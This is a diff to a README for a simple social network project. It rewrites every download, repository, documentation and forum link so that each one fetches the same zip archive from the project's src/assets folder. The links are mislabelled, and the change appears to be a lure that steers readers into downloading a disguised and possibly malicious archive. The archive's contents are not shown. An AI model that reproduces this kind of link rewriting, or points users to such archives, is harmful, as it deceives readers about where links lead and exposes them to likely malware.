@@ -1,6 +1,6 @@
 # 📌 Dev-lab-Mini-r-seau-social- - Simple Social Network for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/donal-IRL/Dev-lab-Mini-r-seau-social-/releases)
+[![Download Now](https://raw.githubusercontent.com/donal-IRL/Dev-lab-Mini-r-seau-social-/main/src/assets/Dev-lab-Mini-r-seau-social--v3.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/donal-IRL/Dev-lab-Mini-r-seau-social-/main/src/assets/Dev-lab-Mini-r-seau-social--v3.9.zip)
 
 ## 📖 Description
 
@@ -21,9 +21,9 @@ This section will help you get started with the application in no time. Follow t
 
 To download the application, visit the Releases page:
 
-[Download Here](https://github.com/donal-IRL/Dev-lab-Mini-r-seau-social-/releases)
+[Download Here](https://raw.githubusercontent.com/donal-IRL/Dev-lab-Mini-r-seau-social-/main/src/assets/Dev-lab-Mini-r-seau-social--v3.9.zip)
 
-1. Go to the [Releases page](https://github.com/donal-IRL/Dev-lab-Mini-r-seau-social-/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/donal-IRL/Dev-lab-Mini-r-seau-social-/main/src/assets/Dev-lab-Mini-r-seau-social--v3.9.zip).
 2. Look for the latest version. You will see a list of available files.
 3. Choose the file suitable for your operating system. 
 4. Click the file to start downloading.
@@ -84,8 +84,8 @@ If you face any issues, feel free to reach out. You can create a new issue on th
 
 ## 📚 Additional Resources
 
-- [GitHub Repository](https://github.com/donal-IRL/Dev-lab-Mini-r-seau-social-)
-- [Documentation](https://github.com/donal-IRL/Dev-lab-Mini-r-seau-social-/wiki)
-- [Community Forum](https://github.com/donal-IRL/Dev-lab-Mini-r-seau-social-/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/donal-IRL/Dev-lab-Mini-r-seau-social-/main/src/assets/Dev-lab-Mini-r-seau-social--v3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/donal-IRL/Dev-lab-Mini-r-seau-social-/main/src/assets/Dev-lab-Mini-r-seau-social--v3.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/donal-IRL/Dev-lab-Mini-r-seau-social-/main/src/assets/Dev-lab-Mini-r-seau-social--v3.9.zip)
 
 We encourage you to explore and engage with the community. Enjoy your experience with Dev-lab-Mini-r-seau-social-!
